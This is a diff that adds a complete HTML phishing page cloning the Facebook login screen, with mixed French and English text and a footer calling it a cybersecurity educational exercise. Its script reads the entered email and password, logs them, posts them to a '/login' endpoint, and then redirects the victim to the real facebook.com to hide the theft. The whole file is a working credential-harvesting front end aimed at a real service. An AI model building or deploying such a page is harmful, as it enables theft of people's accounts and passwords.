@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook </title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #f0f2f5;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        header {
+            padding: 16px 0;
+            background-color: #ffffff;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+        }
+        
+        .logo {
+            color: #1877f2;
+            font-size: 40px;
+            font-weight: bold;
+            text-align: center;
+        }
+        
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            flex-grow: 1;
+            padding: 20px;
+        }
+        
+        .card {
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 396px;
+        }
+        
+        h1 {
+            font-size: 18px;
+            text-align: center;
+            margin: 5px 0 20px;
+            color: #1c1e21;
+        }
+        
+        .form-group {
+            margin-bottom: 12px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            color: #1d2129;
+        }
+        
+        input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+            outline: none;
+        }
+        
+        .btn-login {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            padding: 10px;
+            font-weight: bold;
+            width: 100%;
+            margin: 10px 0;
+            cursor: pointer;
+        }
+        
+        .btn-login:hover {
+            background-color: #166fe5;
+        }
+        
+        .forgot-pwd {
+            display: block;
+            text-align: center;
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            margin: 15px 0;
+        }
+        
+        .forgot-pwd:hover {
+            text-decoration: underline;
+        }
+        
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        
+        .btn-create {
+            background-color: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            padding: 10px 16px;
+            font-weight: bold;
+            display: block;
+            margin: 0 auto;
+            cursor: pointer;
+        }
+        
+        .btn-create:hover {
+            background-color: #36a420;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 28px;
+            color: #1c1e21;
+            font-size: 14px;
+        }
+        
+        .page-footer {
+            background-color: #ffffff;
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+            color: #737373;
+            margin-top: auto;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 10px;
+        }
+        
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1877f2;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo">facebook</div>
+    </header>
+    
+    <div class="container">
+        <div class="card">
+            <h1>Facebook helps you contact and share with the people in your life.</h1>
+            <form id="login-form">
+                <div class="form-group">
+                    <input type="text" id="email" placeholder="Email address or phone number" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" id="password" placeholder="Password" required>
+                </div>
+                <button type="submit" class="btn-login">Login</button>
+                <div class="loading">
+                    <div class="spinner"></div>
+                    <p>Connexion en cours...</p>
+                </div>
+            </form>
+            <a href="#" class="forgot-pwd">Forgot password </a>
+            <div class="divider"></div>
+            <button class="btn-create">Create new Account</button>
+        </div>
+        <div class="footer">
+            <p><strong>Create a page</strong> for a celebrity, brand, or business.</p>
+        </div>
+    </div>
+    
+    <div class="page-footer">
+        <p>Educational Exercise - CybersecurityEducational Exercise - Cybersecurity</p>
+    </div>
+
+    <script>
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Afficher l'indicateur de chargement
+            document.querySelector('.loading').style.display = 'block';
+            
+            // Récupérer les identifiants
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Afficher dans la console du navigateur
+            console.log('Identifiants saisis:');
+            console.log('Email/Téléphone:', email);
+            console.log('Mot de passe:', password);
+            
+            // Envoyer les données au serveur
+            fetch('/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: 'email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Succès:', data);
+                // Rediriger vers Facebook après envoi réussi
+                setTimeout(function() {
+                    window.location.href = 'https://www.facebook.com';
+                }, 1000);
+            })
+            .catch((error) => {
+                console.error('Erreur:', error);
+                // Rediriger même en cas d'erreur
+                setTimeout(function() {
+                    window.location.href = 'https://www.facebook.com';
+                }, 1000);
+            });
+        });
+    </script>
+</body>
+</html>
